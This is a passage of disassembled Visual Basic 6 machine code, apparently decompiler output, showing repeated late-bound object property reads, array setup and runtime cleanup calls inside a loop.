00868D2B: lea eax, var_7C
00868D2E: push eax
00868D2F: lea eax, var_6C
00868D32: push eax
00868D33: push 0000000Ah
00868D35: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00868D3A: add esp, 0000002Ch
00868D3D: mov var_00000168, 00000002h
00868D47: mov var_00000170, 00000003h
00868D51: mov var_00000128, 00000002h
00868D5B: mov var_00000130, 00000003h
00868D65: lea eax, var_24
00868D68: mov var_00000118, eax
00868D6E: mov var_00000120, 0000400Ch
00868D78: cmp [008F2010h], 00000000h
00868D7F: jnz 868D9Ch
00868D81: push 008F2010h
00868D86: push 00433984h
00868D8B: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00868D90: mov var_00000240, 008F2010h
00868D9A: jmp 868DA6h
00868D9C: mov var_00000240, 008F2010h
00868DA6: push 00000010h
00868DA8: pop eax
00868DA9: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00868DAE: lea esi, var_00000130
00868DB4: mov edi, esp
00868DB6: movsd 
00868DB7: movsd 
00868DB8: movsd 
00868DB9: movsd 
00868DBA: push 00000001h
00868DBC: push 00000010h
00868DBE: push 00440E58h
00868DC3: push 00000010h
00868DC5: pop eax
00868DC6: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00868DCB: lea esi, var_00000120
00868DD1: mov edi, esp
00868DD3: movsd 
00868DD4: movsd 
00868DD5: movsd 
00868DD6: movsd 
00868DD7: push 00000001h
00868DD9: push 00000000h
00868DDB: push 00440E48h
00868DE0: push 00000000h
00868DE2: push 00000018h
00868DE4: mov eax, var_00000240
00868DEA: mov eax, [eax]
00868DEC: mov ecx, var_00000240
00868DF2: mov ecx, [ecx]
00868DF4: mov ecx, [ecx]
00868DF6: push eax
00868DF7: call [ecx+0000054Ch]
00868DFD: push eax
00868DFE: lea eax, var_40
00868E01: push eax
00868E02: call 00410A84h ; Set (object)
00868E07: push eax
00868E08: lea eax, var_6C
00868E0B: push eax
00868E0C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00868E11: add esp, 00000010h
00868E14: push eax
00868E15: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00868E1A: push eax
00868E1B: lea eax, var_44
00868E1E: push eax
00868E1F: call 00410A84h ; Set (object)
00868E24: push eax
00868E25: lea eax, var_7C
00868E28: push eax
00868E29: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00868E2E: add esp, 00000020h
00868E31: push eax
00868E32: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00868E37: push eax
00868E38: lea eax, var_48
00868E3B: push eax
00868E3C: call 00410A84h ; Set (object)
00868E41: push eax
00868E42: lea eax, var_0000008C
00868E48: push eax
00868E49: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00868E4E: add esp, 00000020h
00868E51: push eax
00868E52: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
00868E57: mov var_000000F4, eax
00868E5D: mov var_000000FC, 00000008h
00868E67: lea eax, var_24
00868E6A: mov var_00000148, eax
00868E70: mov var_00000150, 0000400Ch
00868E7A: cmp [008F2010h], 00000000h
00868E81: jnz 868E9Eh
00868E83: push 008F2010h
00868E88: push 00433984h
00868E8D: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00868E92: mov var_00000244, 008F2010h
00868E9C: jmp 868EA8h
00868E9E: mov var_00000244, 008F2010h
00868EA8: push 00000000h
00868EAA: push 00000014h
00868EAC: push 00440E58h
00868EB1: push 00000010h
00868EB3: pop eax
00868EB4: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00868EB9: lea esi, var_00000150
00868EBF: mov edi, esp
00868EC1: movsd 
00868EC2: movsd 
00868EC3: movsd 
00868EC4: movsd 
00868EC5: push 00000001h
00868EC7: push 00000000h
00868EC9: push 00440E48h
00868ECE: push 00000000h
00868ED0: push 00000018h
00868ED2: mov eax, var_00000244
00868ED8: mov eax, [eax]
00868EDA: mov ecx, var_00000244
00868EE0: mov ecx, [ecx]
00868EE2: mov ecx, [ecx]
00868EE4: push eax
00868EE5: call [ecx+0000054Ch]
00868EEB: push eax
00868EEC: lea eax, var_4C
00868EEF: push eax
00868EF0: call 00410A84h ; Set (object)
00868EF5: push eax
00868EF6: lea eax, var_0000009C
00868EFC: push eax
00868EFD: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00868F02: add esp, 00000010h
00868F05: push eax
00868F06: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00868F0B: push eax
00868F0C: lea eax, var_50
00868F0F: push eax
00868F10: call 00410A84h ; Set (object)
00868F15: push eax
00868F16: lea eax, var_000000AC
00868F1C: push eax
00868F1D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00868F22: add esp, 00000020h
00868F25: push eax
00868F26: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00868F2B: push eax
00868F2C: lea eax, var_54
00868F2F: push eax
00868F30: call 00410A84h ; Set (object)
00868F35: push eax
00868F36: lea eax, var_000000BC
00868F3C: push eax
00868F3D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00868F42: add esp, 00000010h
00868F45: push eax
00868F46: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
00868F4B: mov var_000000D4, eax
00868F51: mov var_000000DC, 00000008h
00868F5B: push 00000010h
00868F5D: pop eax
00868F5E: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00868F63: lea esi, var_00000170
00868F69: mov edi, esp
00868F6B: movsd 
00868F6C: movsd 
00868F6D: movsd 
00868F6E: movsd 
00868F6F: push 00000010h
00868F71: pop eax
00868F72: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00868F77: lea esi, var_000000FC
00868F7D: mov edi, esp
00868F7F: movsd 
00868F80: movsd 
00868F81: movsd 
00868F82: movsd 
00868F83: push 00000001h
00868F85: push 00000010h
00868F87: push 00440E58h
00868F8C: push 00000010h
00868F8E: pop eax
00868F8F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00868F94: lea esi, var_000000DC
00868F9A: mov edi, esp
00868F9C: movsd 
00868F9D: movsd 
00868F9E: movsd 
00868F9F: movsd 
00868FA0: push 00000001h
00868FA2: push 00000000h
00868FA4: push 00440E48h
00868FA9: push 00000000h
00868FAB: push 00000018h
00868FAD: push var_000001A8
00868FB3: lea eax, var_000000CC
00868FB9: push eax
00868FBA: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00868FBF: add esp, 00000010h
00868FC2: push eax
00868FC3: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00868FC8: push eax
00868FC9: lea eax, var_58
00868FCC: push eax
00868FCD: call 00410A84h ; Set (object)
00868FD2: push eax
00868FD3: lea eax, var_000000EC
00868FD9: push eax
00868FDA: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00868FDF: add esp, 00000020h
00868FE2: push eax
00868FE3: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00868FE8: push eax
00868FE9: lea eax, var_5C
00868FEC: push eax
00868FED: call 00410A84h ; Set (object)
00868FF2: push eax
00868FF3: call 0041095Eh ; msvbvm60.dll.__vbaLateIdCallSt
00868FF8: add esp, 0000002Ch
00868FFB: lea eax, var_5C
00868FFE: push eax
00868FFF: lea eax, var_58
00869002: push eax
00869003: lea eax, var_54
00869006: push eax
00869007: lea eax, var_50
0086900A: push eax
0086900B: lea eax, var_4C
0086900E: push eax
0086900F: lea eax, var_48
00869012: push eax
00869013: lea eax, var_44
00869016: push eax
00869017: lea eax, var_40
0086901A: push eax
0086901B: push 00000008h
0086901D: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00869022: add esp, 00000024h
00869025: lea eax, var_000000FC
0086902B: push eax
0086902C: lea eax, var_000000EC
00869032: push eax
00869033: lea eax, var_000000DC
00869039: push eax
0086903A: lea eax, var_000000CC
00869040: push eax
00869041: lea eax, var_000000BC
00869047: push eax
00869048: lea eax, var_000000AC
0086904E: push eax
0086904F: lea eax, var_0000009C
00869055: push eax
00869056: lea eax, var_0000008C
0086905C: push eax
0086905D: lea eax, var_7C
00869060: push eax
00869061: lea eax, var_6C
00869064: push eax
00869065: push 0000000Ah
00869067: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086906C: add esp, 0000002Ch
0086906F: mov var_00000168, 00000003h
00869079: mov var_00000170, 00000003h
00869083: mov var_00000128, 00000006h
0086908D: mov var_00000130, 00000003h
00869097: lea eax, var_24
0086909A: mov var_00000118, eax
008690A0: mov var_00000120, 0000400Ch
008690AA: cmp [008F2010h], 00000000h
008690B1: jnz 8690CEh
008690B3: push 008F2010h
008690B8: push 00433984h
008690BD: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008690C2: mov var_00000248, 008F2010h
008690CC: jmp 8690D8h
008690CE: mov var_00000248, 008F2010h
008690D8: push 00000010h
008690DA: pop eax
008690DB: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008690E0: lea esi, var_00000130
008690E6: mov edi, esp
008690E8: movsd 
008690E9: movsd 
008690EA: movsd 
008690EB: movsd 
008690EC: push 00000001h
008690EE: push 00000010h
008690F0: push 00440E58h
008690F5: push 00000010h
008690F7: pop eax
008690F8: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008690FD: lea esi, var_00000120
00869103: mov edi, esp
00869105: movsd 
00869106: movsd 
00869107: movsd 
00869108: movsd 
00869109: push 00000001h
0086910B: push 00000000h
0086910D: push 00440E48h
00869112: push 00000000h
00869114: push 00000018h
00869116: mov eax, var_00000248
0086911C: mov eax, [eax]
0086911E: mov ecx, var_00000248
00869124: mov ecx, [ecx]
00869126: mov ecx, [ecx]
00869128: push eax
00869129: call [ecx+0000054Ch]
0086912F: push eax
00869130: lea eax, var_40
00869133: push eax
00869134: call 00410A84h ; Set (object)
00869139: push eax
0086913A: lea eax, var_6C
0086913D: push eax
0086913E: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00869143: add esp, 00000010h
00869146: push eax
00869147: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086914C: push eax
0086914D: lea eax, var_44
00869150: push eax
00869151: call 00410A84h ; Set (object)
00869156: push eax
00869157: lea eax, var_7C
0086915A: push eax
0086915B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00869160: add esp, 00000020h
00869163: push eax
00869164: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00869169: push eax
0086916A: lea eax, var_48
0086916D: push eax
0086916E: call 00410A84h ; Set (object)
00869173: push eax
00869174: lea eax, var_0000008C
0086917A: push eax
0086917B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00869180: add esp, 00000020h
00869183: push eax
00869184: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
00869189: mov var_000000F4, eax
0086918F: mov var_000000FC, 00000008h
00869199: lea eax, var_24
0086919C: mov var_00000148, eax
008691A2: mov var_00000150, 0000400Ch
008691AC: cmp [008F2010h], 00000000h
008691B3: jnz 8691D0h
008691B5: push 008F2010h
008691BA: push 00433984h
008691BF: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008691C4: mov var_0000024C, 008F2010h
008691CE: jmp 8691DAh
008691D0: mov var_0000024C, 008F2010h
008691DA: push 00000000h
008691DC: push 00000014h
008691DE: push 00440E58h
008691E3: push 00000010h
008691E5: pop eax
008691E6: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008691EB: lea esi, var_00000150
008691F1: mov edi, esp
008691F3: movsd 
008691F4: movsd 
008691F5: movsd 
008691F6: movsd 
008691F7: push 00000001h
008691F9: push 00000000h
008691FB: push 00440E48h
00869200: push 00000000h
00869202: push 00000018h
00869204: mov eax, var_0000024C
0086920A: mov eax, [eax]
0086920C: mov ecx, var_0000024C
00869212: mov ecx, [ecx]
00869214: mov ecx, [ecx]
00869216: push eax
00869217: call [ecx+0000054Ch]
0086921D: push eax
0086921E: lea eax, var_4C
00869221: push eax
00869222: call 00410A84h ; Set (object)
00869227: push eax
00869228: lea eax, var_0000009C
0086922E: push eax
0086922F: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00869234: add esp, 00000010h
00869237: push eax
00869238: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086923D: push eax
0086923E: lea eax, var_50
00869241: push eax
00869242: call 00410A84h ; Set (object)
00869247: push eax
00869248: lea eax, var_000000AC
0086924E: push eax
0086924F: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00869254: add esp, 00000020h
00869257: push eax
00869258: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086925D: push eax
0086925E: lea eax, var_54
00869261: push eax
00869262: call 00410A84h ; Set (object)
00869267: push eax
00869268: lea eax, var_000000BC
0086926E: push eax
0086926F: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00869274: add esp, 00000010h
00869277: push eax
00869278: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086927D: mov var_000000D4, eax
00869283: mov var_000000DC, 00000008h
0086928D: push 00000010h
0086928F: pop eax
00869290: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00869295: lea esi, var_00000170
0086929B: mov edi, esp
0086929D: movsd 
0086929E: movsd 
0086929F: movsd 
008692A0: movsd 
008692A1: push 00000010h
008692A3: pop eax
008692A4: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008692A9: lea esi, var_000000FC
008692AF: mov edi, esp
008692B1: movsd 
008692B2: movsd 
008692B3: movsd 
008692B4: movsd 
008692B5: push 00000001h
008692B7: push 00000010h
008692B9: push 00440E58h
008692BE: push 00000010h
008692C0: pop eax
008692C1: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008692C6: lea esi, var_000000DC
008692CC: mov edi, esp
008692CE: movsd 
008692CF: movsd 
008692D0: movsd 
008692D1: movsd 
008692D2: push 00000001h
008692D4: push 00000000h
008692D6: push 00440E48h
008692DB: push 00000000h
008692DD: push 00000018h
008692DF: push var_000001A8
008692E5: lea eax, var_000000CC
008692EB: push eax
008692EC: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008692F1: add esp, 00000010h
008692F4: push eax
008692F5: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008692FA: push eax
008692FB: lea eax, var_58
008692FE: push eax
008692FF: call 00410A84h ; Set (object)
00869304: push eax
00869305: lea eax, var_000000EC
0086930B: push eax
0086930C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00869311: add esp, 00000020h
00869314: push eax
00869315: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086931A: push eax
0086931B: lea eax, var_5C
0086931E: push eax
0086931F: call 00410A84h ; Set (object)
00869324: push eax
00869325: call 0041095Eh ; msvbvm60.dll.__vbaLateIdCallSt
0086932A: add esp, 0000002Ch
0086932D: lea eax, var_5C
00869330: push eax
00869331: lea eax, var_58
00869334: push eax
00869335: lea eax, var_54
00869338: push eax
00869339: lea eax, var_50
0086933C: push eax
0086933D: lea eax, var_4C
00869340: push eax
00869341: lea eax, var_48
00869344: push eax
00869345: lea eax, var_44
00869348: push eax
00869349: lea eax, var_40
0086934C: push eax
0086934D: push 00000008h
0086934F: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00869354: add esp, 00000024h
00869357: lea eax, var_000000FC
0086935D: push eax
0086935E: lea eax, var_000000EC
00869364: push eax
00869365: lea eax, var_000000DC
0086936B: push eax
0086936C: lea eax, var_000000CC
00869372: push eax
00869373: lea eax, var_000000BC
00869379: push eax
0086937A: lea eax, var_000000AC
00869380: push eax
00869381: lea eax, var_0000009C
00869387: push eax
00869388: lea eax, var_0000008C
0086938E: push eax
0086938F: lea eax, var_7C
00869392: push eax
00869393: lea eax, var_6C
00869396: push eax
00869397: push 0000000Ah
00869399: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086939E: add esp, 0000002Ch
008693A1: mov var_00000168, 00000004h
008693AB: mov var_00000170, 00000003h
008693B5: mov var_00000128, 00000007h
008693BF: mov var_00000130, 00000003h
008693C9: lea eax, var_24
008693CC: mov var_00000118, eax
008693D2: mov var_00000120, 0000400Ch
008693DC: cmp [008F2010h], 00000000h
008693E3: jnz 869400h
008693E5: push 008F2010h
008693EA: push 00433984h
008693EF: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008693F4: mov var_00000250, 008F2010h
008693FE: jmp 86940Ah
00869400: mov var_00000250, 008F2010h
0086940A: push 00000010h
0086940C: pop eax
0086940D: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00869412: lea esi, var_00000130
00869418: mov edi, esp
0086941A: movsd 
0086941B: movsd 
0086941C: movsd 
0086941D: movsd 
0086941E: push 00000001h
00869420: push 00000010h
00869422: push 00440E58h
00869427: push 00000010h
00869429: pop eax
0086942A: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086942F: lea esi, var_00000120
00869435: mov edi, esp
00869437: movsd 
00869438: movsd 
00869439: movsd 
0086943A: movsd 
0086943B: push 00000001h
0086943D: push 00000000h
0086943F: push 00440E48h
00869444: push 00000000h
00869446: push 00000018h
00869448: mov eax, var_00000250
0086944E: mov eax, [eax]
00869450: mov ecx, var_00000250
00869456: mov ecx, [ecx]
00869458: mov ecx, [ecx]
0086945A: push eax
0086945B: call [ecx+0000054Ch]
00869461: push eax
00869462: lea eax, var_40
00869465: push eax
00869466: call 00410A84h ; Set (object)
0086946B: push eax
0086946C: lea eax, var_6C
0086946F: push eax
00869470: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00869475: add esp, 00000010h
00869478: push eax
00869479: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086947E: push eax
0086947F: lea eax, var_44
00869482: push eax
00869483: call 00410A84h ; Set (object)
00869488: push eax
00869489: lea eax, var_7C
0086948C: push eax
0086948D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00869492: add esp, 00000020h
00869495: push eax
00869496: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086949B: push eax
0086949C: lea eax, var_48
0086949F: push eax
008694A0: call 00410A84h ; Set (object)
008694A5: push eax
008694A6: lea eax, var_0000008C
008694AC: push eax
008694AD: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008694B2: add esp, 00000020h
008694B5: push eax
008694B6: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008694BB: mov var_000000F4, eax
008694C1: mov var_000000FC, 00000008h
008694CB: lea eax, var_24
008694CE: mov var_00000148, eax
008694D4: mov var_00000150, 0000400Ch
008694DE: cmp [008F2010h], 00000000h
008694E5: jnz 869502h
008694E7: push 008F2010h
008694EC: push 00433984h
008694F1: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008694F6: mov var_00000254, 008F2010h
00869500: jmp 86950Ch
00869502: mov var_00000254, 008F2010h
0086950C: push 00000000h
0086950E: push 00000014h
00869510: push 00440E58h
00869515: push 00000010h
00869517: pop eax
00869518: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086951D: lea esi, var_00000150
00869523: mov edi, esp
00869525: movsd 
00869526: movsd 
00869527: movsd 
00869528: movsd 
00869529: push 00000001h
0086952B: push 00000000h
0086952D: push 00440E48h
00869532: push 00000000h
00869534: push 00000018h
00869536: mov eax, var_00000254
0086953C: mov eax, [eax]
0086953E: mov ecx, var_00000254
00869544: mov ecx, [ecx]
00869546: mov ecx, [ecx]
00869548: push eax
00869549: call [ecx+0000054Ch]
0086954F: push eax
00869550: lea eax, var_4C
00869553: push eax
00869554: call 00410A84h ; Set (object)
00869559: push eax
0086955A: lea eax, var_0000009C
00869560: push eax
00869561: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00869566: add esp, 00000010h
00869569: push eax
0086956A: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086956F: push eax
00869570: lea eax, var_50
00869573: push eax
00869574: call 00410A84h ; Set (object)
00869579: push eax
0086957A: lea eax, var_000000AC
00869580: push eax
00869581: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00869586: add esp, 00000020h
00869589: push eax
0086958A: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086958F: push eax
00869590: lea eax, var_54
00869593: push eax
00869594: call 00410A84h ; Set (object)
00869599: push eax
0086959A: lea eax, var_000000BC
008695A0: push eax
008695A1: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008695A6: add esp, 00000010h
008695A9: push eax
008695AA: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008695AF: mov var_000000D4, eax
008695B5: mov var_000000DC, 00000008h
008695BF: push 00000010h
008695C1: pop eax
008695C2: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008695C7: lea esi, var_00000170
008695CD: mov edi, esp
008695CF: movsd 
008695D0: movsd 
008695D1: movsd 
008695D2: movsd 
008695D3: push 00000010h
008695D5: pop eax
008695D6: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008695DB: lea esi, var_000000FC
008695E1: mov edi, esp
008695E3: movsd 
008695E4: movsd 
008695E5: movsd 
008695E6: movsd 
008695E7: push 00000001h
008695E9: push 00000010h
008695EB: push 00440E58h
008695F0: push 00000010h
008695F2: pop eax
008695F3: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008695F8: lea esi, var_000000DC
008695FE: mov edi, esp
00869600: movsd 
00869601: movsd 
00869602: movsd 
00869603: movsd 
00869604: push 00000001h
00869606: push 00000000h
00869608: push 00440E48h
0086960D: push 00000000h
0086960F: push 00000018h
00869611: push var_000001A8
00869617: lea eax, var_000000CC
0086961D: push eax
0086961E: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00869623: add esp, 00000010h
00869626: push eax
00869627: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086962C: push eax
0086962D: lea eax, var_58
00869630: push eax
00869631: call 00410A84h ; Set (object)
00869636: push eax
00869637: lea eax, var_000000EC
0086963D: push eax
0086963E: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00869643: add esp, 00000020h
00869646: push eax
00869647: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086964C: push eax
0086964D: lea eax, var_5C
00869650: push eax
00869651: call 00410A84h ; Set (object)
00869656: push eax
00869657: call 0041095Eh ; msvbvm60.dll.__vbaLateIdCallSt
0086965C: add esp, 0000002Ch
0086965F: lea eax, var_5C
00869662: push eax
00869663: lea eax, var_58
00869666: push eax
00869667: lea eax, var_54
0086966A: push eax
0086966B: lea eax, var_50
0086966E: push eax
0086966F: lea eax, var_4C
00869672: push eax
00869673: lea eax, var_48
00869676: push eax
00869677: lea eax, var_44
0086967A: push eax
0086967B: lea eax, var_40
0086967E: push eax
0086967F: push 00000008h
00869681: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00869686: add esp, 00000024h
00869689: lea eax, var_000000FC
0086968F: push eax
00869690: lea eax, var_000000EC
00869696: push eax
00869697: lea eax, var_000000DC
0086969D: push eax
0086969E: lea eax, var_000000CC
008696A4: push eax
008696A5: lea eax, var_000000BC
008696AB: push eax
008696AC: lea eax, var_000000AC
008696B2: push eax
008696B3: lea eax, var_0000009C
008696B9: push eax
008696BA: lea eax, var_0000008C
008696C0: push eax
008696C1: lea eax, var_7C
008696C4: push eax
008696C5: lea eax, var_6C
008696C8: push eax
008696C9: push 0000000Ah
008696CB: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008696D0: add esp, 0000002Ch
008696D3: push 00000000h
008696D5: lea eax, var_000001A8
008696DB: push eax
008696DC: call 004108E0h ; msvbvm60.dll.__vbaObjSetAddref
008696E1: lea eax, var_24
008696E4: mov var_00000118, eax
008696EA: mov var_00000120, 0000400Ch
008696F4: cmp [008F2010h], 00000000h
008696FB: jnz 869718h
008696FD: push 008F2010h
00869702: push 00433984h
00869707: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0086970C: mov var_00000258, 008F2010h
00869716: jmp 869722h
00869718: mov var_00000258, 008F2010h
00869722: push 00000000h
00869724: push 00000014h
00869726: push 00440E58h
0086972B: push 00000010h
0086972D: pop eax
0086972E: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00869733: lea esi, var_00000120
00869739: mov edi, esp
0086973B: movsd 
0086973C: movsd 
0086973D: movsd 
0086973E: movsd 
0086973F: push 00000001h
00869741: push 00000000h
00869743: push 00440E48h
00869748: push 00000000h
0086974A: push 00000018h
0086974C: mov eax, var_00000258
00869752: mov eax, [eax]
00869754: mov ecx, var_00000258
0086975A: mov ecx, [ecx]
0086975C: mov ecx, [ecx]
0086975E: push eax
0086975F: call [ecx+0000054Ch]
00869765: push eax
00869766: lea eax, var_40
00869769: push eax
0086976A: call 00410A84h ; Set (object)
0086976F: push eax
00869770: lea eax, var_6C
00869773: push eax
00869774: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00869779: add esp, 00000010h
0086977C: push eax
0086977D: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00869782: push eax
00869783: lea eax, var_44
00869786: push eax
00869787: call 00410A84h ; Set (object)
0086978C: push eax
0086978D: lea eax, var_7C
00869790: push eax
00869791: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00869796: add esp, 00000020h
00869799: push eax
0086979A: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086979F: push eax
008697A0: lea eax, var_48
008697A3: push eax
008697A4: call 00410A84h ; Set (object)
008697A9: push eax
008697AA: lea eax, var_0000008C
008697B0: push eax
008697B1: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008697B6: add esp, 00000010h
008697B9: push eax
008697BA: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008697BF: mov edx, eax
008697C1: lea ecx, var_38
008697C4: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008697C9: push eax
008697CA: call 004109DCh ; Val(arg_1)
008697CF: fstp real8 ptr var_00000198
008697D5: push 00000000h
008697D7: push 00000002h
008697D9: push 00000001h
008697DB: push 00000000h
008697DD: lea eax, var_00000110
008697E3: push eax
008697E4: push 00000010h
008697E6: push 00000880h
008697EB: call 00410946h ; ReDim
008697F0: add esp, 0000001Ch
008697F3: lea eax, var_28
008697F6: mov var_00000128, eax
008697FC: mov var_00000130, 00004008h
00869806: lea esi, var_00000130
0086980C: push 00000000h
0086980E: push var_00000110
00869814: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00869819: mov ecx, eax
0086981B: mov edx, esi
0086981D: call 00410940h ; msvbvm60.dll.__vbaVarZero
00869822: mov eax, [ebp+08h]
00869825: mov eax, [eax]
00869827: push [ebp+08h]
0086982A: call [eax+00000300h]
00869830: mov var_00000094, eax
00869836: mov var_0000009C, 00000009h
00869840: lea esi, var_0000009C
00869846: push 00000001h
00869848: push var_00000110
0086984E: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00869853: mov ecx, eax
00869855: mov edx, esi
00869857: call 00410940h ; msvbvm60.dll.__vbaVarZero
0086985C: lea eax, var_30
0086985F: mov var_00000138, eax
00869865: mov var_00000140, 00004005h
0086986F: lea esi, var_00000140
00869875: push 00000002h
00869877: push var_00000110
0086987D: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00869882: mov ecx, eax
00869884: mov edx, esi
00869886: call 00410940h ; msvbvm60.dll.__vbaVarZero
0086988B: mov edx, 0043D7C8h ; x79
00869890: lea ecx, var_3C
00869893: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
00869898: lea eax, var_00000110
0086989E: push eax
0086989F: lea eax, var_3C
008698A2: push eax
008698A3: fld real8 ptr var_00000198
008698A9: call 004108E6h ; msvbvm60.dll.__vbaFpI2
008698AE: push eax
008698AF: call 007A6910h
008698B4: lea eax, var_00000110
008698BA: push eax
008698BB: push 00000000h
008698BD: call 00410934h ; Erase
008698C2: lea eax, var_3C
008698C5: push eax
008698C6: lea eax, var_38
008698C9: push eax
008698CA: push 00000002h
008698CC: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008698D1: add esp, 0000000Ch
008698D4: lea eax, var_48
008698D7: push eax
008698D8: lea eax, var_44
008698DB: push eax
008698DC: lea eax, var_40
008698DF: push eax
008698E0: push 00000003h
008698E2: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008698E7: add esp, 00000010h
008698EA: lea eax, var_0000008C
008698F0: push eax
008698F1: lea eax, var_7C
008698F4: push eax
008698F5: lea eax, var_6C
008698F8: push eax
008698F9: push 00000003h
008698FB: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00869900: add esp, 00000010h
00869903: call 0041096Ah ; DoEvents
00869908: lea eax, var_000001CC
0086990E: push eax
0086990F: lea eax, var_000001BC
00869915: push eax
00869916: lea eax, var_24
00869919: push eax
0086991A: call 00410A36h ; Next
0086991F: mov var_000001FC, eax
00869925: cmp var_000001FC, 00000000h
0086992C: jnz 008685EBh
00869932: jmp 0086AD9Fh
00869937: mov var_00000118, 00000001h
00869941: mov var_00000120, 00000002h
0086994B: cmp [008F2010h], 00000000h
00869952: jnz 86996Fh
00869954: push 008F2010h
00869959: push 00433984h
0086995E: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00869963: mov var_0000025C, 008F2010h
0086996D: jmp 869979h
0086996F: mov var_0000025C, 008F2010h
00869979: push 00000000h
0086997B: push 00000001h
0086997D: push 00440E48h
00869982: push 00000000h
00869984: push 00000018h
00869986: mov eax, var_0000025C
0086998C: mov eax, [eax]
0086998E: mov ecx, var_0000025C
00869994: mov ecx, [ecx]
00869996: mov ecx, [ecx]
00869998: push eax
00869999: call [ecx+00000550h]
0086999F: push eax
008699A0: lea eax, var_40
008699A3: push eax
008699A4: call 00410A84h ; Set (object)
008699A9: push eax
008699AA: lea eax, var_6C
